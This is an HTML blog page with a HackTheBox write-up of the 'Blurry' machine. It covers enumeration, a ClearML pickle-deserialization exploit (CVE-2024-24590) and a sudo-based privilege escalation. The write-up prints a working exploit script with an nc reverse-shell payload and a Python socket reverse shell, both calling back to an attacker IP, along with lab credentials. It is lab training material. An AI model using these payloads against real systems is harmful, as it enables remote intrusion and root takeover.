<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Blurry Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Linux, Medium">
<meta name="description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/blurry/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/blurry/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><style>
    @media screen and (min-width: 769px) {
         
        .post-content input[type="checkbox"]:checked ~ label > img {
            transform: scale(1.6);
            cursor: zoom-out;
            position: relative;
            z-index: 999;
        }
    
        .post-content img.zoomCheck {
            transition: transform 0.15s ease;
            z-index: 999;
            cursor: zoom-in;
        }
    }
    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/blurry/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Blurry Writeup - HackTheBox">
  <meta property="og:description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-10-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-10-13T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Medium">
    <meta property="og:image" content="http://localhost:1313/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/feature.png">
<meta name="twitter:title" content="Blurry Writeup - HackTheBox">
<meta name="twitter:description" content="Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Blurry Writeup - HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/blurry/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Blurry Writeup - HackTheBox",
  "name": "Blurry Writeup - HackTheBox",
  "description": "Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.",
  "keywords": [
    "HackTheBox", "Linux", "Medium"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Blurry Difficulty Medium Machine Linux Enumeration I performed a quick Nmap scan on the target to identify open ports:\n1 2 3 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:\nsudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E= | 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw= | 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://app.blurry.htb/ |_http-server-header: nginx/1.18.0 I discovered that the HTTP server is hosted at blurry.htb, and the Nmap results also revealed app.blurry.htb. To access these web pages, I added both domains to the /etc/hosts file using the following command:\n1 echo \"10.10.11.19 blurry.htb app.blurry.htb\" \u003e\u003e /etc/hosts I also ran a Gobuster vhost scan to search for additional subdomains:\n1 gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain Surprisingly, the scan revealed more subdomains. I added all of them to the /etc/hosts file as well:\n1 echo \"10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb\" \u003e\u003e /etc/hosts After visiting all the subdomains, I noticed that files.blurry.htb only displayed a simple “OK” message.\nThe app.blurry.htb subdomain hosts ClearML, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.\nThe chat.blurry.htb subdomain hosts the third-party service Rocket.Chat on its own.\nIt looks similar to Discord. I registered an account and logged in to the page.\nThere seems to be a default #general channel for new accounts, which reveals that jippity is the admin.\nUser Flag Now, I will try to set up ClearML locally on my machine.\nI followed this guide to set it up:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 ┌──(kali㉿kali)-[~/blurry] └─$ sudo apt install python3.11-venv [sudo] password for kali: Reading package lists... Done Building dependency tree... Done Reading state information... Done The following packages were automatically installed and are no longer required: libdaxctl1 libgphoto2-l10n libndctl6 libntfs-3g89 libpmem1 libre2-10 linux-image-6.6.9-amd64 python3-mistune0 samba-ad-provision samba-dsdb-modules Use 'sudo apt autoremove' to remove them. The following NEW packages will be installed: python3.11-venv 0 upgraded, 1 newly installed, 0 to remove and 394 not upgraded. Need to get 5,884 B of archives. After this operation, 28.7 kB of additional disk space will be used. Get:1 http://kali.download/kali kali-rolling/main amd64 python3.11-venv amd64 3.11.9-1 [5,884 B] Fetched 5,884 B in 0s (62.8 kB/s) Selecting previously unselected package python3.11-venv. (Reading database ... 461710 files and directories currently installed.) Preparing to unpack .../python3.11-venv_3.11.9-1_amd64.deb ... Unpacking python3.11-venv (3.11.9-1) ... Setting up python3.11-venv (3.11.9-1) ... ┌──(kali㉿kali)-[~/blurry] └─$ python3 -m venv .env ┌──(kali㉿kali)-[~/blurry] └─$ source .env/bin/activate ┌──(.env)─(kali㉿kali)-[~/blurry] └─$ pip install clearml [...INSTALLING CLEARML....] ┌──(.env)─(kali㉿kali)-[~/blurry] └─$ clearml-init ClearML SDK setup process Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) Or create a free account at https://app.clear.ml/settings/workspace-configuration In settings page, press \"Create new credentials\", then press \"Copy to clipboard\". Paste copied configuration here: api { web_server: http://app.blurry.htb api_server: http://api.blurry.htb files_server: http://files.blurry.htb credentials { \"access_key\" = \"Y2Y197NIHJ5OJJRTFBAR\" \"secret_key\" = \"Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3\" } } Detected credentials key=\"Y2Y197NIHJ5OJJRTFBAR\" secret=\"Kx5U***\" ClearML Hosts configuration: Web App: http://app.blurry.htb API: http://api.blurry.htb File Store: http://files.blurry.htb Verifying credentials ... Credentials verified! New configuration stored in /home/kali/clearml.conf ClearML setup completed successfully. The configuration file can be found at the app.blurry.htb endpoint when we enter a username, select “New Experiment,” and retrieve the config file from there.\nI found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import os import subprocess from clearml import Task class ShellExecutor: def __reduce__(self): cmd = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.16.62 4444 \u003e/tmp/f\" return (subprocess.call, (cmd,)) shell_executor = ShellExecutor() task = Task.init( project_name=\"Black Swan\", task_name=\"r3zyd3v\", tags=[\"review\"], task_type=Task.TaskTypes.data_processing, output_uri=True ) task.upload_artifact( name=\"r3zyd3v\", artifact_object=shell_executor, retries=2, wait_on_upload=True ) task.execute_remotely(queue_name='default') Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:\ncmd = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.16.62 4444 \u003e/tmp/f\" here.\nOnce we run the script, it creates a task, uploads the artifact, and then we receive the shell.\nAt this point, we have a shell as the user and have obtained the user flag.\nRoot Flag If I run sudo -l, I can see that I can execute the /usr/bin/evaluate_model binary as root without needing a password.\n1 2 3 4 5 6 7 jippity@blurry:~$ sudo -l Matching Defaults entries for jippity on blurry: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jippity may run the following commands on blurry: (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth This Bash script searches for files that end with .pth in the /models directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.\nI will now open a Netcat session on my Kali machine on port 6969. Then, I removed the evaluate_model.py script from the /models directory.\n1 2 3 4 5 6 7 jippity@blurry:~$ cd /models jippity@blurry:/models$ ls demo_model.pth evaluate_model.py jippity@blurry:/models$ rm -r evaluate_model.py rm: remove write-protected regular file 'evaluate_model.py'? y jippity@blurry:/models$ ls demo_model.pth I created the same file (which I made using echo and appended the code) named evaluate_model.py with the script shown below (the output of the cat command):\n1 2 3 jippity@blurry:/models$ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.10.16.62\", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")' \u003e evaluate_model.py jippity@blurry:/models$ cat evaluate_model.py echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.10.16.62\", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")' \u003e evaluate_model.py I ran sudo /usr/bin/evaluate_model /models/*.pth, and when I checked my Netcat session, I saw:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/blurry/CVE] └─$ nc -lnvp 6969 listening on [any] 6969 ... connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976 root@blurry:/models# cd ~ cd ~ root@blurry:~# id id uid=0(root) gid=0(root) groups=0(root) We rooted this box.\nConclusion Thank you for following my write-up for this medium yet fun box from Hack The Box!\n",
  "wordCount" : "1143",
  "inLanguage": "en",
  "image":"http://localhost:1313/feature.png","datePublished": "2024-10-13T00:00:00Z",
  "dateModified": "2024-10-13T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/hackthebox/blurry/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
                    <span>👨🏼‍💻 About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
                    <span>✍️ Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="📂 Archives">
                    <span>📂 Archives</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
                    <span>🏷️ Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
                    <span>🔍 Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Blurry Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.
    </div>
    <div class="post-meta"><span title='2024-10-13 00:00:00 +0000 UTC'>October 13, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1143 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Blurry/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/blurry/feature.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Blurry">https://app.hackthebox.com/machines/Blurry</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Medium</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Linux</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<p>I performed a quick Nmap scan on the target to identify open ports:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack
</span></span></code></pre></td></tr></table>
</div>
</div><p>After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:</p>
<p><code>sudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
</span></span><span class="line"><span class="cl">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
</span></span><span class="line"><span class="cl">|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
</span></span><span class="line"><span class="cl">|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://app.blurry.htb/
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
</span></span></code></pre></td></tr></table>
</div>
</div><p>I discovered that the HTTP server is hosted at <strong>blurry.htb</strong>, and the Nmap results also revealed <strong>app.blurry.htb</strong>. To access these web pages, I added both domains to the <code>/etc/hosts</code> file using the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;10.10.11.19 blurry.htb app.blurry.htb&#34; &gt;&gt; /etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>I also ran a Gobuster vhost scan to search for additional subdomains:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain
</span></span></code></pre></td></tr></table>
</div>
</div><p>Surprisingly, the scan revealed more subdomains. I added all of them to the <code>/etc/hosts</code> file as well:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb&#34; &gt;&gt; /etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>After visiting all the subdomains, I noticed that <strong>files.blurry.htb</strong> only displayed a simple &ldquo;OK&rdquo; message.</p>
<p>The <strong>app.blurry.htb</strong> subdomain hosts <strong>ClearML</strong>, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-e4a8b" hidden>
    <label for="zoomCheck-e4a8b">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled.png" alt="Untitled" 
             />
    </label></p>
<p>The <strong>chat.blurry.htb</strong> subdomain hosts the third-party service <strong>Rocket.Chat</strong> on its own.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-63069" hidden>
    <label for="zoomCheck-63069">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%201.png" alt="Untitled" 
             />
    </label></p>
<p>It looks similar to Discord. I registered an account and logged in to the page.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-cf268" hidden>
    <label for="zoomCheck-cf268">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%202.png" alt="Untitled" 
             />
    </label></p>
<p>There seems to be a default <strong>#general</strong> channel for new accounts, which reveals that <code>jippity</code> is the admin.</p>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>Now, I will try to set up ClearML locally on my machine.</p>
<p>I followed this guide to set it up:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blurry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">kali</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="n">Reading</span> <span class="n">package</span> <span class="n">lists</span><span class="o">...</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="n">Building</span> <span class="n">dependency</span> <span class="n">tree</span><span class="o">...</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="n">Reading</span> <span class="n">state</span> <span class="n">information</span><span class="o">...</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">following</span> <span class="n">packages</span> <span class="n">were</span> <span class="n">automatically</span> <span class="n">installed</span> <span class="ow">and</span> <span class="n">are</span> <span class="n">no</span> <span class="n">longer</span> <span class="n">required</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">libdaxctl1</span> <span class="n">libgphoto2</span><span class="o">-</span><span class="n">l10n</span> <span class="n">libndctl6</span> <span class="n">libntfs</span><span class="o">-</span><span class="mi">3</span><span class="n">g89</span> <span class="n">libpmem1</span> <span class="n">libre2</span><span class="o">-</span><span class="mi">10</span> <span class="n">linux</span><span class="o">-</span><span class="n">image</span><span class="o">-</span><span class="mf">6.6</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span> <span class="n">python3</span><span class="o">-</span><span class="n">mistune0</span>
</span></span><span class="line"><span class="cl">  <span class="n">samba</span><span class="o">-</span><span class="n">ad</span><span class="o">-</span><span class="n">provision</span> <span class="n">samba</span><span class="o">-</span><span class="n">dsdb</span><span class="o">-</span><span class="n">modules</span>
